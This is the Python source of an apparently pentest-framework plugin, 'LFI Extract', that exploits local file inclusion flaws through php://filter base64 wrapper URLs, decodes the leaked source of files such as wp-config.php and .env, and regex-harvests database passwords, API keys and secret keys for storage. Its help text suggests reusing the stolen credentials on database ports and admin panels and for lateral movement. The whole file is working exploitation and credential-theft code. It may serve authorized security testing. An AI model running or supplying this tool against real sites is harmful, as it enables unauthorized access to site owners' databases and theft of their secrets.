#!/usr/bin/env python3
"""
souleyez.plugins.lfi_extract - Extract credentials from LFI vulnerabilities

A custom SoulEyez tool that:
1. Takes PHP filter wrapper URLs discovered by FFUF LFI scans
2. Fetches the base64-encoded source code
3. Decodes and parses for credentials (database passwords, API keys, etc.)
4. Stores extracted credentials in the credentials table

This is "glue" tooling - it bridges the gap between LFI discovery and
credential exploitation.
"""

import base64
import json
import re
import time
import warnings
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

from .plugin_base import PluginBase

# Suppress SSL warnings for pentesting
warnings.filterwarnings("ignore", message="Unverified HTTPS request")

HELP = {
    "name": "LFI Extract - Credential Extraction from LFI",
    "description": (
        "Extracts credentials from Local File Inclusion (LFI) vulnerabilities.\n\n"
        "When PHP filter wrapper URLs are discovered (e.g., via FFUF LFI scan), "
        "this tool fetches the base64-encoded source code, decodes it, and "
        "parses for credentials.\n\n"
        "Supported extraction:\n"
        "- Database credentials (MySQL, PostgreSQL, etc.)\n"
        "- API keys and tokens\n"
        "- Configuration secrets\n"
        "- WordPress wp-config.php credentials\n"
        "- Laravel .env files\n"
    ),
    "usage": "souleyez jobs enqueue lfi_extract <url>",
    "examples": [
        "souleyez jobs enqueue lfi_extract 'http://target/?page=php://filter/convert.base64-encode/resource=config'",
        "souleyez jobs enqueue lfi_extract --urls-file /tmp/lfi_urls.txt",
    ],
    "flags": [
        ["--timeout <sec>", "Request timeout per URL (default: 10)"],
        ["--urls-file <path>", "File containing URLs to extract (one per line)"],
        ["--max-urls <n>", "Maximum URLs to process (default: 20)"],
    ],
    "presets": [
        {"name": "Quick Extract", "args": [], "desc": "Extract from single URL"},
        {
            "name": "Batch Extract",
            "args": ["--max-urls", "50"],
            "desc": "Process up to 50 URLs",
        },
    ],
    "help_sections": [
        {
            "title": "What is LFI Credential Extraction?",
            "color": "cyan",
            "content": [
                (
                    "Overview",
                    [
                        "Extracts credentials from Local File Inclusion (LFI) vulnerabilities",
                        "Uses PHP filter wrappers to read source code as base64",
                        "Parses decoded content for database passwords, API keys, etc.",
                    ],
                ),
                (
                    "How LFI Works",
                    [
                        "LFI allows reading local files through web parameters",
                        "php://filter/convert.base64-encode bypasses PHP execution",
                        "Returns raw source code instead of executed output",
                        "Source code often contains hardcoded credentials",
                    ],
                ),
            ],
        },
        {
            "title": "Usage & Examples",
            "color": "green",
            "content": [
                (
                    "Single URL",
                    [
                        "souleyez jobs enqueue lfi_extract 'http://target/?page=php://filter/convert.base64-encode/resource=config'",
                        "  → Fetches and decodes the config file",
                    ],
                ),
                (
                    "From FFUF Results",
                    [
                        "FFUF LFI scan finds vulnerable parameters",
                        "Auto-chain triggers lfi_extract on discovered URLs",
                        "Credentials automatically stored in database",
                    ],
                ),
            ],
        },
        {
            "title": "What Gets Extracted",
            "color": "yellow",
            "content": [
                (
                    "Credential Types",
                    [
                        "Database credentials (MySQL, PostgreSQL, SQLite)",
                        "WordPress wp-config.php (DB_USER, DB_PASSWORD)",
                        "Laravel .env files (DB_*, APP_KEY, API tokens)",
                        "API keys and tokens in config files",
                    ],
                ),
                (
                    "Common Target Files",
                    [
                        "config.php, settings.php, database.php",
                        "wp-config.php (WordPress)",
                        ".env (Laravel, Node.js)",
                        "includes/config.inc.php (many apps)",
                    ],
                ),
            ],
        },
        {
            "title": "After Extraction",
            "color": "magenta",
            "content": [
                (
                    "Next Steps",
                    [
                        "Credentials stored in SoulEyez database automatically",
                        "Try database creds on MySQL/PostgreSQL ports (3306, 5432)",
                        "Use extracted creds for lateral movement",
                        "Check if same password used for admin panels",
                    ],
                ),
            ],
        },
    ],
}

# Credential patterns to search for in decoded PHP/config files
CREDENTIAL_PATTERNS = [
    # PHP variable assignments
    (r'\$(?:password|passwd|pass|pwd)\s*=\s*["\']([^"\']+)["\']', "password"),
    (r'\$(?:username|user|usr|login|db_user)\s*=\s*["\']([^"\']+)["\']', "username"),
    (r'\$(?:database|db|dbname|db_name)\s*=\s*["\']([^"\']+)["\']', "database"),
    (r'\$(?:server|host|hostname|db_host)\s*=\s*["\']([^"\']+)["\']', "host"),
    # Array-style configs
    (r'["\']password["\']\s*=>\s*["\']([^"\']+)["\']', "password"),
    (r'["\']username["\']\s*=>\s*["\']([^"\']+)["\']', "username"),
    (r'["\']user["\']\s*=>\s*["\']([^"\']+)["\']', "username"),
    (r'["\']database["\']\s*=>\s*["\']([^"\']+)["\']', "database"),
    (r'["\']host["\']\s*=>\s*["\']([^"\']+)["\']', "host"),
    # WordPress defines
    (r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", "password"),
    (r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", "username"),
    (r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", "database"),
    (r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", "host"),
    # Laravel/dotenv style
    (r'DB_PASSWORD\s*=\s*["\']?([^"\'\s\n]+)["\']?', "password"),
    (r'DB_USERNAME\s*=\s*["\']?([^"\'\s\n]+)["\']?', "username"),
    (r'DB_DATABASE\s*=\s*["\']?([^"\'\s\n]+)["\']?', "database"),
    (r'DB_HOST\s*=\s*["\']?([^"\'\s\n]+)["\']?', "host"),
    # API keys and tokens
    (
        r'(?:api_key|apikey|api_secret|secret_key)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?',
        "api_key",
    ),
    (
        r'(?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY)\s*[=:]\s*["\']([^"\']+)["\']',
        "secret_key",
    ),
    # Generic connection strings
    (r"mysql://([^:]+):([^@]+)@([^/]+)/(\w+)", "connection_string"),
    (r"postgresql://([^:]+):([^@]+)@([^/]+)/(\w+)", "connection_string"),
]

# Files that commonly contain credentials
HIGH_VALUE_FILES = [
    "config.php",
    "configuration.php",
    "settings.php",
    "database.php",
    "db.php",
    "connect.php",
    "connection.php",
    "conn.php",
    "wp-config.php",
    "config.inc.php",
    "db.inc.php",
    ".env",
    "env.php",
    "environment.php",
]


class LfiExtractPlugin(PluginBase):
    """Custom SoulEyez tool for extracting credentials from LFI vulnerabilities."""

    name = "LFI Extract"
    tool = "lfi_extract"
    category = "exploitation"
    HELP = HELP

    def build_command(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ):
        """
        LFI extraction is done in Python, not via external command.
        Return None to use run() method instead.
        """
        return None

    def check_tool_available(self) -> bool:
        """Built-in tool - always available."""
        return True

    def run(
        self, target: str, args: List[str] = None, label: str = "", log_path: str = None
    ) -> int:
        """Execute LFI credential extraction."""
        args = args or []
        timeout = 10
        max_urls = 20
        urls_file = None

        # Parse args
        i = 0
        while i < len(args):
            if args[i] == "--timeout" and i + 1 < len(args):
                try:
                    timeout = int(args[i + 1])
                except ValueError:
                    pass
                i += 2
            elif args[i] == "--max-urls" and i + 1 < len(args):
                try:
                    max_urls = int(args[i + 1])
                except ValueError:
                    pass
                i += 2
            elif args[i] == "--urls-file" and i + 1 < len(args):
                urls_file = args[i + 1]
                i += 2
            else:
                i += 1

        # Collect URLs to process
        urls_to_process = []

        # If urls_file provided, read from it
        if urls_file:
            try:
                with open(urls_file, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            urls_to_process.append(line)
            except FileNotFoundError:
                pass

        # If target is a URL, add it
        if target and target.startswith("http"):
            urls_to_process.append(target)

        # Filter to only PHP filter URLs
        php_filter_urls = [
            url
            for url in urls_to_process
            if "php://filter" in url and "base64-encode" in url
        ]

        # Prioritize config files
        prioritized = []
        other = []
        for url in php_filter_urls:
            url_lower = url.lower()
            if any(hv in url_lower for hv in HIGH_VALUE_FILES):
                prioritized.append(url)
            else:
                other.append(url)
        urls_to_process = (prioritized + other)[:max_urls]

        try:
            result = self._extract_credentials(urls_to_process, timeout)
            output = self._format_output(target, result, label, urls_to_process)

            if log_path:
                with open(log_path, "w", encoding="utf-8", errors="replace") as fh:
                    fh.write(output)
                    # Write JSON result for parsing
                    fh.write("\n\n=== JSON_RESULT ===\n")
                    fh.write(json.dumps(result, indent=2))
                    fh.write("\n=== END_JSON_RESULT ===\n")

            return 0 if result.get("credentials") else 1

        except Exception as e:
            error_output = f"=== Plugin: LFI Extract ===\n"
            error_output += f"Target: {target}\n"
            error_output += f"Error: {type(e).__name__}: {e}\n"

            if log_path:
                with open(log_path, "w", encoding="utf-8", errors="replace") as fh:
                    fh.write(error_output)

            return 1

    def _extract_credentials(
        self, urls: List[str], timeout: int = 10
    ) -> Dict[str, Any]:
        """
        Fetch PHP filter URLs and extract credentials from decoded content.

        Returns:
            Dict containing:
                - credentials: List of extracted credential dicts
                - sources_processed: Number of URLs successfully processed
                - sources_failed: Number of URLs that failed
                - decoded_files: List of files that were decoded
        """
        import requests

        result = {
            "credentials": [],
            "sources_processed": 0,
            "sources_failed": 0,
            "decoded_files": [],
            "errors": [],
        }

        if not urls:
            result["errors"].append("No PHP filter URLs provided")
            return result

        for url in urls:
            try:
                resp = requests.get(url, timeout=timeout, verify=False)  # nosec B501

                if resp.status_code != 200:
                    result["sources_failed"] += 1
                    result["errors"].append(f"HTTP {resp.status_code}: {url[:80]}")
                    continue

                # Extract base64 from response
                html = resp.text
                base64_pattern = r"([A-Za-z0-9+/]{50,}={0,2})"
                matches = re.findall(base64_pattern, html)

                if not matches:
                    result["sources_failed"] += 1
                    result["errors"].append(f"No base64 found: {url[:80]}")
                    continue

                for b64_match in matches:
                    try:
                        decoded = base64.b64decode(b64_match).decode(
                            "utf-8", errors="ignore"
                        )

                        # Skip if it doesn't look like code
                        if (
                            "<?php" not in decoded
                            and "$" not in decoded
                            and "=" not in decoded
                        ):
                            continue

                        # Extract source file name from URL
                        source_file = self._extract_source_file(url)
                        result["decoded_files"].append(source_file)
                        result["sources_processed"] += 1

                        # Extract credentials
                        creds = self._parse_credentials(decoded, url, source_file)
                        if creds:
                            result["credentials"].extend(creds)

                        break  # Found valid content, move to next URL

                    except Exception:
                        continue

            except requests.RequestException as e:
                result["sources_failed"] += 1
                result["errors"].append(f"Request failed: {str(e)[:50]}")
            except Exception as e:
                result["sources_failed"] += 1
                result["errors"].append(f"Error: {str(e)[:50]}")

        return result

    def _extract_source_file(self, url: str) -> str:
        """Extract the source file name from a PHP filter URL."""
        # Look for resource= parameter
        match = re.search(r"resource=([^&\s]+)", url)
        if match:
            resource = match.group(1)
            # Clean up the resource path
            if "/" in resource:
                return resource.split("/")[-1]
            return resource
        return "unknown"

    def _parse_credentials(
        self, content: str, source_url: str, source_file: str
    ) -> List[Dict[str, Any]]:
        """Parse decoded content for credentials."""
        credentials = []
        found = {"username": None, "password": None, "database": None, "host": None}

        for pattern, field in CREDENTIAL_PATTERNS:
            if field == "connection_string":
                # Handle connection strings specially
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    groups = match.groups()
                    if len(groups) >= 4:
                        found["username"] = groups[0]
                        found["password"] = groups[1]
                        found["host"] = groups[2]
                        found["database"] = groups[3]
            else:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    value = match.group(1)
                    # Don't overwrite with empty or placeholder values
                    if value and value not in (
                        "",
                        "root",
                        "localhost",
                        "127.0.0.1",
                        "password",
                        "changeme",
                    ):
                        if not found.get(field):
                            found[field] = value
                    elif not found.get(field):
                        # Accept default values like 'root' if nothing else found
                        found[field] = value

        # If we found at least username and password, create credential entry
        if found.get("username") and found.get("password"):
            credentials.append(
                {
                    "username": found["username"],
                    "password": found["password"],
                    "database": found.get("database"),
                    "host": found.get("host", "localhost"),
                    "source_url": source_url,
                    "source_file": source_file,
                    "credential_type": "database",
                }
            )

        # Also look for API keys as separate credentials
        for pattern, field in CREDENTIAL_PATTERNS:
            if field in ("api_key", "secret_key"):
                for match in re.finditer(pattern, content, re.IGNORECASE):
                    key_value = match.group(1)
                    if len(key_value) >= 20:  # API keys are usually long
                        credentials.append(
                            {
                                "api_key": key_value,
                                "source_url": source_url,
                                "source_file": source_file,
                                "credential_type": field,
                            }
                        )

        return credentials

    def _format_output(
        self, target: str, result: Dict[str, Any], label: str, urls: List[str]
    ) -> str:
        """Format extraction results for log output."""
        lines = []
        lines.append("=" * 70)
        lines.append("=== Plugin: LFI Extract (SoulEyez Built-in) ===")
        lines.append("=" * 70)
        lines.append(f"Target: {target}")
        if label:
            lines.append(f"Label: {label}")
        lines.append(
            f"Started: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}"
        )
        lines.append("")
        lines.append(f"URLs processed: {result['sources_processed']}")
        lines.append(f"URLs failed: {result['sources_failed']}")
        lines.append(f"Files decoded: {', '.join(result['decoded_files']) or 'None'}")
        lines.append("")

        if result.get("credentials"):
            lines.append("=" * 70)
            lines.append("CREDENTIALS EXTRACTED")
            lines.append("=" * 70)
            lines.append("")

            for i, cred in enumerate(result["credentials"], 1):
                if cred.get("credential_type") == "database":
                    lines.append(f"[{i}] DATABASE CREDENTIALS")
                    lines.append(f"    Username: {cred.get('username')}")
                    lines.append(f"    Password: {cred.get('password')}")
                    lines.append(f"    Database: {cred.get('database', 'unknown')}")
                    lines.append(f"    Host: {cred.get('host', 'localhost')}")
                    lines.append(f"    Source: {cred.get('source_file')}")
                elif cred.get("credential_type") in ("api_key", "secret_key"):
                    lines.append(
                        f"[{i}] {cred.get('credential_type', 'API KEY').upper()}"
                    )
                    key = cred.get("api_key", "")
                    lines.append(
                        f"    Key: {key[:20]}...{key[-10:] if len(key) > 30 else key}"
                    )
                    lines.append(f"    Source: {cred.get('source_file')}")
                lines.append("")

        else:
            lines.append("No credentials found in decoded files.")
            lines.append("")

        if result.get("errors"):
            lines.append("-" * 40)
            lines.append("Errors encountered:")
            for err in result["errors"][:10]:
                lines.append(f"  - {err}")
            lines.append("")

        lines.append(
            f"\n=== Completed: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())} ==="
        )

        return "\n".join(lines)


plugin = LfiExtractPlugin()
